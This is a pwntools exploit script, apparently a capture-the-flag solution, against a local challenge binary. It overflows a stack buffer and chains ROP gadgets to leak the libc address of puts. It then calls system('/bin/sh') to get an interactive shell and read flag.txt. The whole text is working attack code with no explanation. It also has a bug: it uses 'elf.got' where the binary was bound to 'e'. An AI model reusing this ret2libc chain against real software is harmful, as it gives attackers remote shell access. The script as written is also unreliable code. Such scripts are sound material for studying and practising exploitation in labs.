from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
e = context.binary = ELF('./challenge')
# lib = e.libc
lib = ELF('libc-2.31.so')
# r = process('./challenge')
r = remote("localhost" , 2682)
pop_rdi_ret = 0x0000000000401393
ret = 0x000000000040101a
puts_got = elf.got["puts"]
puts_plt = 0x4010a0
main =  0x4011f1
payload = b"a"*0x38+ flat( pop_rdi_ret, puts_got, puts_plt, main)
pause()
r.sendlineafter(b"name? \n",payload)
r.recvline()
r.sendlineafter(b"flag! \n",b"a")
r.recvline()
puts_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("puts_libc: %#x" %puts_libc)
base_libc = puts_libc - lib.sym.puts
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("binsh_libc: %#x" %binsh_libc)

payload = b"a"*0x38
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, ret)
pause()
r.sendlineafter(b"name? \n",payload)

r.recvline()
pause()
r.sendlineafter(b"flag! \n",b"a")

r.sendline(b"cat flag.txt")
# pause()
r.interactive()